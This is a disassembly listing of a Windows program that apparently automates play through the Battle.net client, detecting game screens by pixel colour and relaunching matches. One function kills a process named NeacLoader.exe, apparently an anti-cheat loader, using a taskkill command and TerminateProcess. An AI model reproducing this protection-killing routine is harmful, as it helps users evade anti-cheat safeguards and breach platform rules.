0000000140002720  jne      0x140002737                                      ; 0x140002737
0000000140002722  call     qword ptr [rip + 0x5e28]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140002728  cmp      eax, edi                                        
000000014000272a  jl       0x14000270e                                      ; 0x14000270e
000000014000272c  mov      rbx, qword ptr [rsp + 0x30]                     
0000000140002731  add      rsp, 0x20                                        ; 0x20
0000000140002735  pop      rdi                                             
0000000140002736  ret                                                      
0000000140002737  cmp      dword ptr [rip + 0x9b36], 1                      ; 0x14000c274 | 0x1
000000014000273e  jne      0x140002745                                      ; 0x140002745
0000000140002740  call     0x140002360                                      ; 0x140002360
0000000140002745  xor      ecx, ecx                                        
0000000140002747  call     qword ptr [rip + 0x5a63]                         ; 0x1400081b0 KERNEL32.DLL!ExitThread
000000014000274d  int3                                                     
000000014000274e  int3                                                     
000000014000274f  int3                                                     

; FUNCTION 0x140002750

0000000140002750  mov      qword ptr [rsp + 8], rbx                        
0000000140002755  push     rdi                                             
0000000140002756  sub      rsp, 0x270                                       ; 0x270
000000014000275d  mov      rax, qword ptr [rip + 0x98dc]                    ; 0x14000c040
0000000140002764  xor      rax, rsp                                        
0000000140002767  mov      qword ptr [rsp + 0x260], rax                    
000000014000276f  lea      rcx, [rip + 0x6112]                              ; 0x140008888 "taskkill /T /F /IM NeacLoader.exe"
0000000140002776  call     qword ptr [rip + 0x5d1c]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
000000014000277c  mov      ecx, 0x1f4                                       ; 0x1f4
0000000140002781  call     qword ptr [rip + 0x5a39]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002787  xor      edx, edx                                        
0000000140002789  lea      ecx, [rdx + 2]                                  
000000014000278c  call     qword ptr [rip + 0x596e]                         ; 0x140008100 KERNEL32.DLL!CreateToolhelp32Snapshot
0000000140002792  mov      rbx, rax                                        
0000000140002795  cmp      rax, -1                                          ; -0x1
0000000140002799  je       0x14000280f                                      ; 0x14000280f
000000014000279b  lea      rdx, [rsp + 0x20]                               
00000001400027a0  mov      dword ptr [rsp + 0x20], 0x238                    ; 0x238
00000001400027a8  mov      rcx, rax                                        
00000001400027ab  call     qword ptr [rip + 0x58bf]                         ; 0x140008070 KERNEL32.DLL!Process32FirstW
00000001400027b1  jmp      0x140002802                                      ; 0x140002802
00000001400027b3  lea      rdx, [rip + 0x60f6]                              ; 0x1400088b0 "NeacLoader.exe"
00000001400027ba  lea      rcx, [rsp + 0x4c]                               
00000001400027bf  call     0x140007226                                      ; 0x140007226
00000001400027c4  test     eax, eax                                        
00000001400027c6  jne      0x1400027f4                                      ; 0x1400027f4
00000001400027c8  mov      r8d, dword ptr [rsp + 0x28]                     
00000001400027cd  lea      ecx, [rax + 1]                                  
00000001400027d0  xor      edx, edx                                        
00000001400027d2  call     qword ptr [rip + 0x5998]                         ; 0x140008170 KERNEL32.DLL!OpenProcess
00000001400027d8  mov      rdi, rax                                        
00000001400027db  test     rax, rax                                        
00000001400027de  je       0x1400027f4                                      ; 0x1400027f4
00000001400027e0  xor      edx, edx                                        
00000001400027e2  mov      rcx, rax                                        
00000001400027e5  call     qword ptr [rip + 0x59e5]                         ; 0x1400081d0 KERNEL32.DLL!TerminateProcess
00000001400027eb  mov      rcx, rdi                                        
00000001400027ee  call     qword ptr [rip + 0x5884]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
00000001400027f4  lea      rdx, [rsp + 0x20]                               
00000001400027f9  mov      rcx, rbx                                        
00000001400027fc  call     qword ptr [rip + 0x585e]                         ; 0x140008060 KERNEL32.DLL!Process32NextW
0000000140002802  test     eax, eax                                        
0000000140002804  jne      0x1400027b3                                      ; 0x1400027b3
0000000140002806  mov      rcx, rbx                                        
0000000140002809  call     qword ptr [rip + 0x5869]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
000000014000280f  mov      rcx, qword ptr [rsp + 0x260]                    
0000000140002817  xor      rcx, rsp                                        
000000014000281a  call     0x1400062f0                                      ; 0x1400062f0
000000014000281f  mov      rbx, qword ptr [rsp + 0x280]                    
0000000140002827  add      rsp, 0x270                                       ; 0x270
000000014000282e  pop      rdi                                             
000000014000282f  ret                                                      

; FUNCTION 0x140002830

0000000140002830  push     rbx                                             
0000000140002832  push     rbp                                             
0000000140002833  push     rsi                                             
0000000140002834  push     rdi                                             
0000000140002835  push     r14                                             
0000000140002837  push     r15                                             
0000000140002839  sub      rsp, 0x28                                        ; 0x28
000000014000283d  call     qword ptr [rip + 0x5d0d]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140002843  mov      rcx, qword ptr [rip + 0x99ee]                    ; 0x14000c238
000000014000284a  add      eax, 0x1d4c0                                     ; 0x1d4c0
000000014000284f  mov      dword ptr [rip + 0x9a1b], eax                    ; 0x14000c270
0000000140002855  call     qword ptr [rip + 0x5aad]                         ; 0x140008308 USER32.dll!IsWindow
000000014000285b  test     eax, eax                                        
000000014000285d  je       0x140002870                                      ; 0x140002870
000000014000285f  lea      rcx, [rip + 0x606a]                              ; 0x1400088d0 "关闭游戏窗口。"
0000000140002866  call     0x140001474                                      ; 0x140001474
000000014000286b  call     0x140002750                                      ; 0x140002750
0000000140002870  lea      rdx, [rip + 0x6069]                              ; 0x1400088e0 "战网错误"
0000000140002877  lea      rcx, [rip + 0x6072]                              ; 0x1400088f0 "Qt5151QWindowIcon"
000000014000287e  call     qword ptr [rip + 0x5ab4]                         ; 0x140008338 USER32.dll!FindWindowA
0000000140002884  mov      qword ptr [rip + 0x99ad], rax                    ; 0x14000c238
000000014000288b  test     rax, rax                                        
000000014000288e  je       0x1400028ce                                      ; 0x1400028ce
0000000140002890  xor      ecx, ecx                                        
0000000140002892  call     0x140001828                                      ; 0x140001828
0000000140002897  movss    xmm1, dword ptr [rip + 0x9819]                   ; 0x14000c0b8
000000014000289f  xor      r8d, r8d                                        
00000001400028a2  movaps   xmm0, xmm1                                      
00000001400028a5  mulss    xmm1, dword ptr [rip + 0x6afb]                   ; 0x1400093a8
00000001400028ad  mulss    xmm0, dword ptr [rip + 0x6afb]                   ; 0x1400093b0
00000001400028b5  cvttss2si ecx, xmm1                                       
00000001400028b9  cvttss2si edx, xmm0                                       
00000001400028bd  call     0x1400014e0                                      ; 0x1400014e0
00000001400028c2  lea      rcx, [rip + 0x603f]                              ; 0x140008908 "重新连接"
00000001400028c9  call     0x140001474                                      ; 0x140001474
00000001400028ce  lea      rdx, [rip + 0x603f]                              ; 0x140008914 "战网"
00000001400028d5  lea      rcx, [rip + 0x6044]                              ; 0x140008920 "Chrome_WidgetWin_0"
00000001400028dc  call     qword ptr [rip + 0x5a56]                         ; 0x140008338 USER32.dll!FindWindowA
00000001400028e2  mov      qword ptr [rip + 0x994f], rax                    ; 0x14000c238
00000001400028e9  test     rax, rax                                        
00000001400028ec  jne      0x140002910                                      ; 0x140002910
00000001400028ee  lea      rcx, [rip + 0x6043]                              ; 0x140008938 "战网窗口不存在！"
00000001400028f5  call     0x140001474                                      ; 0x140001474
00000001400028fa  lea      rcx, [rip + 0x604b]                              ; 0x14000894c "pause"
0000000140002901  call     qword ptr [rip + 0x5b91]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
0000000140002907  xor      ecx, ecx                                        
0000000140002909  call     qword ptr [rip + 0x5b81]                         ; 0x140008490 api-ms-win-crt-runtime-l1-1-0.dll!exit
000000014000290f  int3                                                     
0000000140002910  xor      ecx, ecx                                        
0000000140002912  call     0x140001828                                      ; 0x140001828
0000000140002917  movss    xmm3, dword ptr [rip + 0x9799]                   ; 0x14000c0b8
000000014000291f  lea      rcx, [rip + 0x6032]                              ; 0x140008958 "等待启动游戏"
0000000140002926  mov      eax, dword ptr [rip + 0x9950]                    ; 0x14000c27c
000000014000292c  movaps   xmm0, xmm3                                      
000000014000292f  mulss    xmm0, dword ptr [rip + 0x6a85]                   ; 0x1400093bc
0000000140002937  movaps   xmm1, xmm3                                      
000000014000293a  mulss    xmm1, dword ptr [rip + 0x6a72]                   ; 0x1400093b4
0000000140002942  cvttss2si ebx, xmm0                                       
0000000140002946  movd     xmm2, eax                                       
000000014000294a  cvtdq2ps xmm2, xmm2                                      
000000014000294d  movaps   xmm0, xmm2                                      
0000000140002950  subss    xmm0, xmm1                                      
0000000140002954  movaps   xmm1, xmm3                                      
0000000140002957  mulss    xmm1, dword ptr [rip + 0x6a61]                   ; 0x1400093c0
000000014000295f  cvttss2si r14d, xmm1                                      
0000000140002964  movd     xmm1, dword ptr [rip + 0x98e8]                   ; 0x14000c254
000000014000296c  cvttss2si edi, xmm0                                       
0000000140002970  cvtdq2pd xmm1, xmm1                                      
0000000140002974  movaps   xmm0, xmm3                                      
0000000140002977  mulss    xmm0, dword ptr [rip + 0x6a39]                   ; 0x1400093b8
000000014000297f  subss    xmm2, xmm0                                      
0000000140002983  movaps   xmm0, xmm3                                      
0000000140002986  mulss    xmm0, dword ptr [rip + 0x6a12]                   ; 0x1400093a0
000000014000298e  mulss    xmm3, dword ptr [rip + 0x6a0e]                   ; 0x1400093a4
0000000140002996  cvtps2pd xmm0, xmm0                                      
0000000140002999  cvttss2si r15d, xmm2                                      
000000014000299e  movsd    xmm2, qword ptr [rip + 0x686a]                   ; 0x140009210
00000001400029a6  mulsd    xmm1, xmm2                                      
00000001400029aa  subsd    xmm1, xmm0                                      
00000001400029ae  cvtps2pd xmm0, xmm3                                      
00000001400029b1  cvttsd2si esi, xmm1                                       
00000001400029b5  movd     xmm1, eax                                       
00000001400029b9  cvtdq2pd xmm1, xmm1                                      
00000001400029bd  mulsd    xmm1, xmm2                                      
00000001400029c1  addsd    xmm1, xmm0                                      
00000001400029c5  cvttsd2si ebp, xmm1                                       
00000001400029c9  call     0x140001474                                      ; 0x140001474
00000001400029ce  jmp      0x140002bcb                                      ; 0x140002bcb
00000001400029d3  xor      edx, edx                                        
00000001400029d5  lea      r8d, [rdx + 2]                                  
00000001400029d9  call     0x140001de0                                      ; 0x140001de0
00000001400029de  mov      r9, qword ptr [rip + 0x9873]                     ; 0x14000c258
00000001400029e5  mov      r10d, dword ptr [rip + 0x9890]                   ; 0x14000c27c
00000001400029ec  mov      r8d, dword ptr [rip + 0x9861]                    ; 0x14000c254
00000001400029f3  test     r9, r9                                          
00000001400029f6  je       0x140002a1e                                      ; 0x140002a1e
00000001400029f8  test     r14d, r14d                                      
00000001400029fb  js       0x140002a1e                                      ; 0x140002a1e
00000001400029fd  test     r15d, r15d                                      
0000000140002a00  js       0x140002a1e                                      ; 0x140002a1e
0000000140002a02  cmp      r14d, r8d                                       
0000000140002a05  jge      0x140002a1e                                      ; 0x140002a1e
0000000140002a07  cmp      r15d, r10d                                      
0000000140002a0a  jge      0x140002a1e                                      ; 0x140002a1e
0000000140002a0c  mov      eax, r15d                                       
0000000140002a0f  imul     eax, r8d                                        
0000000140002a13  add      eax, r14d                                       
0000000140002a16  cdqe                                                     
0000000140002a18  mov      r11d, dword ptr [r9 + rax*4]                    
0000000140002a1c  jmp      0x140002a22                                      ; 0x140002a22
0000000140002a1e  or       r11d, 0xffffffff                                 ; 0xffffffff
0000000140002a22  mov      eax, r11d                                       
0000000140002a25  mov      edx, 0x74                                        ; 0x74
0000000140002a2a  sar      eax, 8                                           ; 0x8
0000000140002a2d  movzx    ecx, al                                         
0000000140002a30  sub      edx, ecx                                        
0000000140002a32  mov      ecx, 0xe0                                        ; 0xe0
0000000140002a37  mov      eax, edx                                        
0000000140002a39  neg      eax                                             
0000000140002a3b  cmovs    eax, edx                                        
0000000140002a3e  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002a41  movzx    eax, r11b                                       
0000000140002a45  sub      ecx, eax                                        
0000000140002a47  mov      eax, ecx                                        
0000000140002a49  neg      eax                                             
0000000140002a4b  cmovs    eax, ecx                                        
0000000140002a4e  sar      r11d, 0x10                                       ; 0x10
0000000140002a52  imul     eax, eax, 0xb                                    ; 0xb
0000000140002a55  movzx    ecx, r11b                                       
0000000140002a59  neg      ecx                                             
0000000140002a5b  add      edx, eax                                        
0000000140002a5d  mov      eax, ecx                                        
0000000140002a5f  neg      eax                                             
0000000140002a61  cmovs    eax, ecx                                        
0000000140002a64  imul     eax, eax, 0x1e                                   ; 0x1e
0000000140002a67  add      edx, eax                                        
0000000140002a69  cmp      edx, 0xbb8                                       ; 0xbb8
0000000140002a6f  jle      0x140002b31                                      ; 0x140002b31
0000000140002a75  test     r9, r9                                          
0000000140002a78  je       0x140002a9c                                      ; 0x140002a9c
0000000140002a7a  test     esi, esi                                        
0000000140002a7c  js       0x140002a9c                                      ; 0x140002a9c
0000000140002a7e  test     ebp, ebp                                        
0000000140002a80  js       0x140002a9c                                      ; 0x140002a9c
0000000140002a82  cmp      esi, r8d                                        
0000000140002a85  jge      0x140002a9c                                      ; 0x140002a9c
0000000140002a87  cmp      ebp, r10d                                       
0000000140002a8a  jge      0x140002a9c                                      ; 0x140002a9c
0000000140002a8c  mov      eax, ebp                                        
0000000140002a8e  imul     eax, r8d                                        
0000000140002a92  add      eax, esi                                        
0000000140002a94  cdqe                                                     
0000000140002a96  mov      r11d, dword ptr [r9 + rax*4]                    
0000000140002a9a  jmp      0x140002aa0                                      ; 0x140002aa0
0000000140002a9c  or       r11d, 0xffffffff                                 ; 0xffffffff
0000000140002aa0  mov      eax, r11d                                       
0000000140002aa3  mov      edx, 0x74                                        ; 0x74
0000000140002aa8  sar      eax, 8                                           ; 0x8
0000000140002aab  movzx    ecx, al                                         
0000000140002aae  sub      edx, ecx                                        
0000000140002ab0  mov      ecx, 0xe0                                        ; 0xe0
0000000140002ab5  mov      eax, edx                                        
0000000140002ab7  neg      eax                                             
0000000140002ab9  cmovs    eax, edx                                        
0000000140002abc  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002abf  movzx    eax, r11b                                       
0000000140002ac3  sub      ecx, eax                                        
0000000140002ac5  mov      eax, ecx                                        
0000000140002ac7  neg      eax                                             
0000000140002ac9  cmovs    eax, ecx                                        
0000000140002acc  sar      r11d, 0x10                                       ; 0x10
0000000140002ad0  imul     eax, eax, 0xb                                    ; 0xb
0000000140002ad3  movzx    ecx, r11b                                       
0000000140002ad7  neg      ecx                                             
0000000140002ad9  add      edx, eax                                        
0000000140002adb  mov      eax, ecx                                        
0000000140002add  neg      eax                                             
0000000140002adf  cmovs    eax, ecx                                        
0000000140002ae2  imul     eax, eax, 0x1e                                   ; 0x1e
0000000140002ae5  add      edx, eax                                        
0000000140002ae7  cmp      edx, 0xbb8                                       ; 0xbb8
0000000140002aed  jg       0x140002b31                                      ; 0x140002b31
0000000140002aef  xor      r8d, r8d                                        
0000000140002af2  mov      edx, ebp                                        
0000000140002af4  mov      ecx, esi                                        
0000000140002af6  call     0x1400014e0                                      ; 0x1400014e0
0000000140002afb  lea      rcx, [rip + 0x5e66]                              ; 0x140008968 "关闭隐身提示"
0000000140002b02  call     0x140001474                                      ; 0x140001474
0000000140002b07  mov      ecx, 0x1f4                                       ; 0x1f4
0000000140002b0c  call     0x1400026ec                                      ; 0x1400026ec
0000000140002b11  xor      edx, edx                                        
0000000140002b13  lea      r8d, [rdx + 2]                                  
0000000140002b17  call     0x140001de0                                      ; 0x140001de0
0000000140002b1c  mov      r10d, dword ptr [rip + 0x9759]                   ; 0x14000c27c
0000000140002b23  mov      r8d, dword ptr [rip + 0x972a]                    ; 0x14000c254
0000000140002b2a  mov      r9, qword ptr [rip + 0x9727]                     ; 0x14000c258
0000000140002b31  test     r9, r9                                          
0000000140002b34  je       0x140002b58                                      ; 0x140002b58
0000000140002b36  test     ebx, ebx                                        
0000000140002b38  js       0x140002b58                                      ; 0x140002b58
0000000140002b3a  test     edi, edi                                        
0000000140002b3c  js       0x140002b58                                      ; 0x140002b58
0000000140002b3e  cmp      ebx, r8d                                        
0000000140002b41  jge      0x140002b58                                      ; 0x140002b58
0000000140002b43  cmp      edi, r10d                                       
0000000140002b46  jge      0x140002b58                                      ; 0x140002b58
0000000140002b48  mov      eax, edi                                        
0000000140002b4a  imul     eax, r8d                                        
0000000140002b4e  add      eax, ebx                                        
0000000140002b50  cdqe                                                     
0000000140002b52  mov      r8d, dword ptr [r9 + rax*4]                     
0000000140002b56  jmp      0x140002b5c                                      ; 0x140002b5c
0000000140002b58  or       r8d, 0xffffffff                                  ; 0xffffffff
0000000140002b5c  mov      eax, r8d                                        
0000000140002b5f  mov      edx, 0x74                                        ; 0x74
0000000140002b64  sar      eax, 8                                           ; 0x8
0000000140002b67  movzx    ecx, al                                         
0000000140002b6a  sub      edx, ecx                                        
0000000140002b6c  mov      ecx, 0xe0                                        ; 0xe0
0000000140002b71  mov      eax, edx                                        
0000000140002b73  neg      eax                                             
0000000140002b75  cmovs    eax, edx                                        
0000000140002b78  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002b7b  movzx    eax, r8b                                        
0000000140002b7f  sub      ecx, eax                                        
0000000140002b81  mov      eax, ecx                                        
0000000140002b83  neg      eax                                             
0000000140002b85  cmovs    eax, ecx                                        
0000000140002b88  sar      r8d, 0x10                                        ; 0x10
0000000140002b8c  imul     eax, eax, 0xb                                    ; 0xb
0000000140002b8f  movzx    ecx, r8b                                        
0000000140002b93  neg      ecx                                             
0000000140002b95  add      edx, eax                                        
0000000140002b97  mov      eax, ecx                                        
0000000140002b99  neg      eax                                             
0000000140002b9b  cmovs    eax, ecx                                        
0000000140002b9e  imul     eax, eax, 0x1e                                   ; 0x1e
0000000140002ba1  add      edx, eax                                        
0000000140002ba3  cmp      edx, 0xbb8                                       ; 0xbb8
0000000140002ba9  jg       0x140002bc1                                      ; 0x140002bc1
0000000140002bab  xor      r8d, r8d                                        
0000000140002bae  mov      edx, edi                                        
0000000140002bb0  mov      ecx, ebx                                        
0000000140002bb2  call     0x1400014e0                                      ; 0x1400014e0
0000000140002bb7  mov      ecx, 0x1f4                                       ; 0x1f4
0000000140002bbc  call     0x1400026ec                                      ; 0x1400026ec
0000000140002bc1  mov      ecx, 0xf                                         ; 0xf
0000000140002bc6  call     0x1400026ec                                      ; 0x1400026ec
0000000140002bcb  xor      edx, edx                                        
0000000140002bcd  lea      rcx, [rip + 0x5c7c]                              ; 0x140008850 "TankWindowClass"
0000000140002bd4  call     qword ptr [rip + 0x575e]                         ; 0x140008338 USER32.dll!FindWindowA
0000000140002bda  test     rax, rax                                        
0000000140002bdd  je       0x1400029d3                                      ; 0x1400029d3
0000000140002be3  mov      rcx, qword ptr [rip + 0x9676]                    ; 0x14000c260
0000000140002bea  test     rcx, rcx                                        
0000000140002bed  je       0x140002c00                                      ; 0x140002c00
0000000140002bef  call     qword ptr [rip + 0x5453]                         ; 0x140008048 GDI32.dll!DeleteObject
0000000140002bf5  mov      qword ptr [rip + 0x9660], 0                      ; 0x14000c260 | 0x0
0000000140002c00  mov      ecx, 0x3a98                                      ; 0x3a98
0000000140002c05  mov      qword ptr [rip + 0x9648], 0                      ; 0x14000c258 | 0x0
0000000140002c10  call     qword ptr [rip + 0x55aa]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140002c16  add      rsp, 0x28                                        ; 0x28
0000000140002c1a  pop      r15                                             
0000000140002c1c  pop      r14                                             
0000000140002c1e  pop      rdi                                             
0000000140002c1f  pop      rsi                                             
0000000140002c20  pop      rbp                                             
0000000140002c21  pop      rbx                                             
0000000140002c22  jmp      0x1400021ac                                      ; 0x1400021ac
0000000140002c27  int3                                                     

; FUNCTION 0x140002c28

0000000140002c28  mov      qword ptr [rsp + 8], rbx                        
0000000140002c2d  mov      r11d, dword ptr [rip + 0x9644]                   ; 0x14000c278
0000000140002c34  mov      rbx, qword ptr [rip + 0x961d]                    ; 0x14000c258
0000000140002c3b  inc      r11d                                            
0000000140002c3e  imul     r11d, dword ptr [rip + 0x960e]                   ; 0x14000c254
0000000140002c46  add      r11d, dword ptr [rip + 0x95e3]                   ; 0x14000c230
0000000140002c4d  movsxd   rax, r11d                                       
0000000140002c50  mov      r10d, dword ptr [rbx + rax*4 + 0x30]            
0000000140002c55  mov      eax, r10d                                       
0000000140002c58  sar      eax, 8                                           ; 0x8
0000000140002c5b  movzx    eax, al                                         
0000000140002c5e  imul     edx, eax, 0x3b                                   ; 0x3b
0000000140002c61  mov      eax, r10d                                       
0000000140002c64  sar      eax, 0x10                                        ; 0x10
0000000140002c67  movzx    eax, al                                         
0000000140002c6a  imul     ecx, eax, 0x1e                                   ; 0x1e
0000000140002c6d  movzx    eax, r10b                                       
0000000140002c71  add      edx, ecx                                        
0000000140002c73  imul     ecx, eax, 0xb                                    ; 0xb
0000000140002c76  add      edx, ecx                                        
0000000140002c78  cmp      edx, 0x44c                                       ; 0x44c
0000000140002c7e  ja       0x140002cba                                      ; 0x140002cba
0000000140002c80  mov      eax, 0x55555556                                  ; 0x55555556
0000000140002c85  add      r11d, 0xc                                        ; 0xc
0000000140002c89  imul     dword ptr [rip + 0x9599]                         ; 0x14000c228
0000000140002c8f  mov      r9d, 1                                           ; 0x1
0000000140002c95  mov      eax, edx                                        
0000000140002c97  shr      eax, 0x1f                                        ; 0x1f
0000000140002c9a  add      edx, eax                                        
0000000140002c9c  cmp      edx, r9d                                        
0000000140002c9f  jle      0x140002cb6                                      ; 0x140002cb6
0000000140002ca1  lea      ecx, [r9 + r11]                                 
0000000140002ca5  movsxd   r8, ecx                                         
0000000140002ca8  cmp      dword ptr [rbx + r8*4], r10d                    
0000000140002cac  jne      0x140002cba                                      ; 0x140002cba
0000000140002cae  inc      r9d                                             
0000000140002cb1  cmp      r9d, edx                                        
0000000140002cb4  jl       0x140002ca1                                      ; 0x140002ca1
0000000140002cb6  mov      al, 1                                            ; 0x1
0000000140002cb8  jmp      0x140002cbc                                      ; 0x140002cbc
0000000140002cba  xor      al, al                                          
0000000140002cbc  mov      rbx, qword ptr [rsp + 8]                        
0000000140002cc1  ret                                                      
0000000140002cc2  int3                                                     
0000000140002cc3  int3                                                     

; FUNCTION 0x140002cc4

0000000140002cc4  mov      rax, rsp                                        
0000000140002cc7  push     rbp                                             
0000000140002cc8  push     rbx                                             
0000000140002cc9  push     rsi                                             
0000000140002cca  push     rdi                                             
0000000140002ccb  push     r12                                             
0000000140002ccd  push     r14                                             
0000000140002ccf  push     r15                                             
0000000140002cd1  lea      rbp, [rax - 0x48]                               
0000000140002cd5  sub      rsp, 0x110                                       ; 0x110
0000000140002cdc  movaps   xmmword ptr [rax - 0x48], xmm6                  
0000000140002ce0  movaps   xmmword ptr [rax - 0x58], xmm7                  
0000000140002ce4  movaps   xmmword ptr [rax - 0x68], xmm8                  
0000000140002ce9  mov      rax, qword ptr [rip + 0x9350]                    ; 0x14000c040
0000000140002cf0  xor      rax, rsp                                        
0000000140002cf3  mov      qword ptr [rbp - 0x30], rax                     
0000000140002cf7  xor      r15d, r15d                                      
0000000140002cfa  mov      rcx, qword ptr [rip + 0x9537]                    ; 0x14000c238
0000000140002d01  call     qword ptr [rip + 0x5601]                         ; 0x140008308 USER32.dll!IsWindow
0000000140002d07  test     eax, eax                                        
0000000140002d09  jne      0x140002d14                                      ; 0x140002d14
0000000140002d0b  lea      rcx, [rip + 0x5c76]                              ; 0x140008988 "游戏窗口没了，战网重上游戏。"
0000000140002d12  jmp      0x140002d29                                      ; 0x140002d29
0000000140002d14  call     qword ptr [rip + 0x5836]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140002d1a  cmp      eax, dword ptr [rip + 0x9550]                    ; 0x14000c270
0000000140002d20  jle      0x140002d33                                      ; 0x140002d33
0000000140002d22  lea      rcx, [rip + 0x5c7f]                              ; 0x1400089a8 "未匹配时间超过2分钟，战网重上游戏。"
0000000140002d29  call     0x140001474                                      ; 0x140001474
0000000140002d2e  call     0x140002830                                      ; 0x140002830
0000000140002d33  lea      rdx, [rip + 0x59df]                              ; 0x140008719
0000000140002d3a  lea      rcx, [rbp - 0x68]                               
0000000140002d3e  call     0x140004c6c                                      ; 0x140004c6c
0000000140002d43  nop                                                      
0000000140002d44  call     0x14000231c                                      ; 0x14000231c
0000000140002d49  mov      r8d, 0x102                                       ; 0x102
0000000140002d4f  movsd    xmm8, qword ptr [rip + 0x6620]                   ; 0x140009378
0000000140002d58  movaps   xmm1, xmm8                                      
0000000140002d5c  movsd    xmm6, qword ptr [rip + 0x6584]                   ; 0x1400092e8
0000000140002d64  movaps   xmm0, xmm6                                      
0000000140002d67  call     0x140002394                                      ; 0x140002394
0000000140002d6c  mov      ebx, 0xffffff                                    ; 0xffffff
0000000140002d71  mov      edi, 0xf06314                                    ; 0xf06314
0000000140002d76  mov      r14d, 0x258                                      ; 0x258
0000000140002d7c  test     al, al                                          
0000000140002d7e  je       0x140002ddb                                      ; 0x140002ddb
0000000140002d80  mov      r8d, ebx                                        
0000000140002d83  movsd    xmm7, qword ptr [rip + 0x6545]                   ; 0x1400092d0
0000000140002d8b  movaps   xmm1, xmm7                                      
0000000140002d8e  movsd    xmm0, qword ptr [rip + 0x655a]                   ; 0x1400092f0
0000000140002d96  call     0x140002394                                      ; 0x140002394
0000000140002d9b  test     al, al                                          
0000000140002d9d  je       0x140002ddb                                      ; 0x140002ddb
0000000140002d9f  mov      r8d, edi                                        
0000000140002da2  movaps   xmm1, xmm7                                      
0000000140002da5  movaps   xmm0, xmm7                                      
0000000140002da8  call     0x140002394                                      ; 0x140002394
0000000140002dad  test     al, al                                          
0000000140002daf  je       0x140002ddb                                      ; 0x140002ddb
0000000140002db1  lea      rdx, [rip + 0x5c18]                              ; 0x1400089d0 "确认界面"
0000000140002db8  lea      rcx, [rbp - 0x68]                               
0000000140002dbc  call     0x140004a0c                                      ; 0x140004a0c
0000000140002dc1  lea      rcx, [rip + 0x5c18]                              ; 0x1400089e0 "确认离开"
0000000140002dc8  call     0x140001474                                      ; 0x140001474
0000000140002dcd  xor      r8d, r8d                                        
0000000140002dd0  movaps   xmm1, xmm7                                      
0000000140002dd3  movaps   xmm0, xmm7                                      
0000000140002dd6  jmp      0x140003512                                      ; 0x140003512
0000000140002ddb  call     0x140002c28                                      ; 0x140002c28
0000000140002de0  test     al, al                                          
0000000140002de2  je       0x140003279                                      ; 0x140003279
0000000140002de8  lea      rdx, [rip + 0x5c01]                              ; 0x1400089f0 "顶部黑边"
0000000140002def  lea      rcx, [rbp - 0x68]                               
0000000140002df3  call     0x140004a0c                                      ; 0x140004a0c
0000000140002df8  xor      r8d, r8d                                        
0000000140002dfb  movaps   xmm1, xmm6                                      
0000000140002dfe  xorps    xmm0, xmm0                                      
0000000140002e01  call     0x140002394                                      ; 0x140002394
0000000140002e06  test     al, al                                          
0000000140002e08  je       0x140002e52                                      ; 0x140002e52
0000000140002e0a  xor      r8d, r8d                                        
0000000140002e0d  movaps   xmm1, xmm6                                      
0000000140002e10  movaps   xmm0, xmm6                                      
0000000140002e13  call     0x140002394                                      ; 0x140002394
0000000140002e18  test     al, al                                          
0000000140002e1a  je       0x140002e52                                      ; 0x140002e52
0000000140002e1c  xor      r8d, r8d                                        
0000000140002e1f  movaps   xmm1, xmm6                                      
0000000140002e22  movsd    xmm0, qword ptr [rip + 0x63ee]                   ; 0x140009218
0000000140002e2a  call     0x140002394                                      ; 0x140002394
0000000140002e2f  test     al, al                                          
0000000140002e31  je       0x140002e52                                      ; 0x140002e52
0000000140002e33  xor      r8d, r8d                                        
0000000140002e36  movaps   xmm1, xmm8                                      
0000000140002e3a  movaps   xmm0, xmm6                                      
0000000140002e3d  call     0x140002394                                      ; 0x140002394
0000000140002e42  test     al, al                                          
0000000140002e44  je       0x140002e52                                      ; 0x140002e52
0000000140002e46  lea      rdx, [rip + 0x5c53]                              ; 0x140008aa0 "黑屏界面"
0000000140002e4d  jmp      0x140003520                                      ; 0x140003520
0000000140002e52  mov      esi, 0xe1425                                     ; 0xe1425
0000000140002e57  mov      r8d, esi                                        
0000000140002e5a  movaps   xmm1, xmm8                                      
0000000140002e5e  movaps   xmm0, xmm6                                      
0000000140002e61  call     0x140002394                                      ; 0x140002394
0000000140002e66  test     al, al                                          
0000000140002e68  je       0x1400030e1                                      ; 0x1400030e1
0000000140002e6e  lea      rdx, [rip + 0x5b8b]                              ; 0x140008a00 "顶部菜单"
0000000140002e75  lea      rcx, [rbp - 0x68]                               
0000000140002e79  call     0x140004a0c                                      ; 0x140004a0c
0000000140002e7e  call     qword ptr [rip + 0x56cc]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140002e84  add      eax, 0x7d0                                       ; 0x7d0
0000000140002e89  mov      dword ptr [rip + 0x93d9], eax                    ; 0x14000c268
0000000140002e8f  mov      dword ptr [rsp + 0x28], esi                     
0000000140002e93  mov      dword ptr [rsp + 0x20], 0x94077                  ; 0x94077
0000000140002e9b  mov      r9d, 0x98d8                                      ; 0x98d8
0000000140002ea1  mov      r8d, 0x60af                                      ; 0x60af
0000000140002ea7  movsd    xmm1, qword ptr [rip + 0x64d9]                   ; 0x140009388
0000000140002eaf  movsd    xmm0, qword ptr [rip + 0x64c9]                   ; 0x140009380
0000000140002eb7  call     0x1400024c0                                      ; 0x1400024c0
0000000140002ebc  test     al, al                                          
0000000140002ebe  je       0x14000300e                                      ; 0x14000300e
0000000140002ec4  lea      rdx, [rip + 0x5b45]                              ; 0x140008a10 "总览界面"
0000000140002ecb  lea      rcx, [rbp - 0x68]                               
0000000140002ecf  call     0x140004a0c                                      ; 0x140004a0c
0000000140002ed4  mov      r8d, edi                                        
0000000140002ed7  movsd    xmm1, qword ptr [rip + 0x6359]                   ; 0x140009238
0000000140002edf  movsd    xmm0, qword ptr [rip + 0x63d1]                   ; 0x1400092b8
0000000140002ee7  call     0x140002394                                      ; 0x140002394
0000000140002eec  test     al, al                                          
